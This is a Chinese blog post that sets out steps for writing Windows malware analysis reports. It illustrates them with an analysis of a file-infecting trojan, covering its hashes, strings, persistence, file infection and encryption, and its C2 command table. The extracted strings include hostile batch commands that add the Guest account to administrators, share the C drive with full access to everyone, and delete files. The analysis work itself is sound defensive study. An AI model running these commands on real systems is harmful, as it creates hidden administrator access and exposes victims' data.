---
title: PC分析报告撰写流程
date: 2019-12-05 18:04:25
tags: windows病毒分析
---

# 目标 

撰写PC样本分析报告

# 分析流程

## 详细分析报告流程

### 样本功能分析

1. 基础静态分析
2. 高级分析，画流程图理清病毒行为
3. 衍生文件基础静态分析
4. 衍生文件高级分析

### 报告撰写

1. 病毒概况：病毒背景、大致功能
2. 病毒简介：文件名、加壳等特征表格
   1. 病毒行为总概况
3. 分析过程
   1. 主体病毒行为分析
   2. 衍生物行为分析

# 实例

## 感染病毒分析

`5E63F3294520B7C07EB4DA38A2BEA301`

### 基础静态分析

1.执行shell命令，删除文件

2.COM组件操作

3.可能存在衍生PE文件

4.启动服务Server，添加Guest用户、激活并加入到管理员组中，紧接着创建c盘共享

```
导入函数
ShellExecuteA
CoCreateInstance
CoInitialize

资源文件
PE文件：E5BCC51B80BA1D91CB7179FB7A58FED7

字符串：
connect
send
Index.dat
.exe
=.doc
=.xls
=.jpg
=.rar
X.bat
del /a /f /q %0\r\nexit
net start Server\r\nnet user Guest Guest /add\r\nnet user Guest /active:yes\r\nnet user Guest Guest\r\nnet localgroup administrators Guest /add\r\n
net share C$=C: /grant:everyone,full\r\nnet share C$=C:\r\n
net start Server\r\nnet user Guest /active:no\r\ndel /a /f /q %0\r\nexit
```

### 高级分析

打开已存在"C:\Program Files\Common\Microsoft Shared\Index.dat"文件，判断文件开头两数据：

* 0x450：将Index.dat文件头修改成0x49，睡眠一段时间后提权关闭机器
* 0x451：将Index.dat文件头修改为0x50，睡眠一段时间后创建始终处于桌面最上层的全屏并没有任何控件的对话框并设置定时器间隔0.3s就会发送消息将对话框继续放到全屏位置，实现弹窗复位操作，以此来阻止用户手动关闭程序

利用COM组件在开机启动目录中创建快捷方式"C:\Users\15pb-win7\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\水印标签系统.lnk"，实现开机启动C:\Program Files\Common Files\Microsoft Shared\resvr.exe程序

![image-20191226103313003](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191226103313003.png)

判断当前执行的进程模块是否为C:\Program Files\Common\Microsoft Shared\resvr.exe。针对这个判断分两种情况处理：

![image-20191226104541540](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191226104541540.png)

如果当前模块是C:\Program Files\Common\Microsoft Shared\resvr.exe：睡眠1s，然后创建互斥体"40S118T2013"，成功后执行遍历桌面、其他盘符以及其子目录所有文件，如果全局变量dword_402120为0并且文件后缀为`.doc|.xls|.jpg|.rar`，将该文件和resvr.exe内容映射进内存空间

![image-20191226144249357](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191226144249357.png)

将保存这种特定文件长度的地址替换掉内存中0x11111111（前2000字节数据中）后面四字节数据(0xFFFFFFFF)进行存放

将保存这种特定文件后缀的地址替换掉内存中0x222222222e（前2000字节数据中）后面3字节数据进行存放

每中特定文件类型对应一个数字：如.doc对应2，将这个数字存放在内存中的PE文件里资源节中的特定位置处，根据运行结果可以知道这个值决定文件图标的使用

![image-20191226152141295](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191226152141295.png)

随后将修改好的内存数据前面PE文件部分重新写回被遍历的文件中，并且将文件后缀改成exe，如果出现同名则在原本后缀后面加上".exe"

![image-20191226154808774](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191226154808774.png)

当全局变量为dword_402120="0xAABBCCDD"时，将文件映射进内存将其内容全部异或0x5FF80F64u进行简单加密

![image-20191226155456053](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191226155456053.png)

创建线程

 监听受害者机器上所有网卡的40118端口

![image-20191227110337714](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191227110337714.png) 

接收C2服务器的指令执行相应操作，需要满足接收的命令为二进制数据，不能输入ASCII字符(指令7除外)，前4字节是命令，4-8字节是传入数据长度，后面跟着的就是传入的数据

| 指令  |                             操作                             |
| :---: | :----------------------------------------------------------: |
| 0x3EB |                      向C2发送'!Ce'字符                       |
| 0x450 | 写数据到C:\Program Files\Common\Microsoft Shared\Index.dat，提权关机 |
| 0x451 | 写数据到C:\Program Files\Common\Microsoft Shared\Index.dat，创建线程实现无限弹窗 |
| 0x455 |                遍历盘符对所有文件进行简单加密                |
| 0x453 | 创建并执行X.bat文件来实现共享C盘、创建并对Guest用户进行提权，最后删除自身 |
| 0x458 |        DUMP资源节中的PE文件为Message.exe，隐藏并执行         |
|   7   | 将C2发送的指定路径文件(.doc\|.xls\|.jpg)感染成病毒PE文件(同上面特定文件感染操作) |
| 0x452 |                         结束无限弹窗                         |
| 0x454 |     创建并执行X.bat文件来实现禁用Guest用户，最后删除自身     |

下面分析上面关于当前执行模块不是C:\Program Files\Common\Microsoft Shared\resvr.exe文件的两外两种情况。

1.当前执行的进程模块不是C:\Program Files\Common\Microsoft Shared\resvr.exe，并且不是被感染过的".doc|.xls|.rar|.jpg"文件时：将被感染的文件复制到"C:\Program Files\Common\Microsoft Shared\resvr.exe"并且设置为系统文件并隐藏属性

![image-20191227180509078](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191227180509078.png)

接着执行起来复制后的resvr.exe文件

![image-20191228125714855](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191228125714855.png)

2.当前执行的进程模块不是C:\Program Files\Common\Microsoft Shared\resvr.exe，并且是被感染过的".doc|.xls|.rar|.jpg"文件时：

​	1)将当前模块对应PE文件后缀更改成dword_40200C存储的后缀字符并执行起来

​	2)将当前模块dump到C:\Program Files\Common\Microsoft Shared\resvr.exe并执行起来

![image-20191227181520223](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191227181520223.png)

socket连接到本地发送指令7

![image-20191227183638612](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191227183638612.png)

接着上面两种情况都会进行自删除以及删除当前执行模块的可执行文件

![image-20191227181617290](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191227181617290.png)

### 衍生文件基础静态分析

`E5BCC51B80BA1D91CB7179FB7A58FED7`

批处理文件操作

命令执行

```
导入表函数：
CreateFileA
WriteFile
ShellExecuteA

字符串操作：
X.bat
del /a /f /q %0\r\nexit
Begin:\r\ndel /f /q /a "%s"\r\nif exist "%s" goto Begin\r\n
```

### 衍生文件高级分析

批处理删除当前模块pe文件和自身

![image-20191227185213106](D:\Blog\source\_posts\PC分析报告撰写流程\image-20191227185213106.png)

## 参考

【1】[一个感染型木马病毒分析（一）](https://blog.csdn.net/QQ1084283172/article/details/47280673)
